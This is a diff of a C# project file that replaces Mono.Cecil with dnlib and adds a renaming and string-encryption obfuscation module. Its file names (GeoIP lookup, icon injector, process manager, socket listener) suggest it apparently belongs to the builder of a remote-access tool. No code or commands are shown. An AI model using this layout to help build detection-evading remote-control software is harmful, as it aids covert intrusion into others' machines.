@@ -50,13 +50,13 @@
       <SpecificVersion>False</SpecificVersion>
       <HintPath>Resources\cGeoIp.dll</HintPath>
     </Reference>
+    <Reference Include="dnlib, Version=3.2.0.0, Culture=neutral, PublicKeyToken=50e96378b6e77999, processorArchitecture=MSIL">
+      <HintPath>..\packages\dnlib.3.2.0\lib\net45\dnlib.dll</HintPath>
+    </Reference>
     <Reference Include="FastColoredTextBox, Version=2.16.24.0, Culture=neutral, PublicKeyToken=fb8aa12b994ef61b, processorArchitecture=MSIL">
       <HintPath>..\packages\FCTB.2.16.24\lib\FastColoredTextBox.dll</HintPath>
     </Reference>
     <Reference Include="Microsoft.VisualBasic" />
-    <Reference Include="Mono.Cecil, Version=0.10.3.0, Culture=neutral, PublicKeyToken=50cebf1cceb9d05e, processorArchitecture=MSIL">
-      <HintPath>..\packages\Mono.Cecil.0.10.3\lib\net40\Mono.Cecil.dll</HintPath>
-    </Reference>
     <Reference Include="System" />
     <Reference Include="System.Core" />
     <Reference Include="System.IO.Compression" />
@@ -187,7 +187,6 @@
     <Compile Include="Handle Packet\Packet.cs" />
     <Compile Include="Handle Packet\HandleProcessManager.cs" />
     <Compile Include="Helper\AsyncTask.cs" />
-    <Compile Include="Helper\BuildRenamer.cs" />
     <Compile Include="Helper\IconInjector.cs" />
     <Compile Include="Helper\ListViewColumnSorter.cs" />
     <Compile Include="Helper\Methods.cs" />
@@ -210,6 +209,19 @@
       <DesignTime>True</DesignTime>
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
+    <Compile Include="RenamingObfuscation\Classes\Base64.cs" />
+    <Compile Include="RenamingObfuscation\Classes\ClassesRenaming.cs" />
+    <Compile Include="RenamingObfuscation\Classes\DecryptionHelper.cs" />
+    <Compile Include="RenamingObfuscation\Classes\FieldsRenaming.cs" />
+    <Compile Include="RenamingObfuscation\Classes\InjectHelper.cs" />
+    <Compile Include="RenamingObfuscation\Classes\MethodsRenaming.cs" />
+    <Compile Include="RenamingObfuscation\Classes\NamespacesRenaming.cs" />
+    <Compile Include="RenamingObfuscation\Classes\PropertiesRenaming.cs" />
+    <Compile Include="RenamingObfuscation\Classes\Utils.cs" />
+    <Compile Include="RenamingObfuscation\EncryptString.cs" />
+    <Compile Include="RenamingObfuscation\Interfaces\ICrypto.cs" />
+    <Compile Include="RenamingObfuscation\Interfaces\IRenaming.cs" />
+    <Compile Include="RenamingObfuscation\ModuleDefMD.cs" />
     <Compile Include="Settings.cs" />
     <Compile Include="Socket\Clients.cs" />
     <Compile Include="Socket\Listener.cs" />
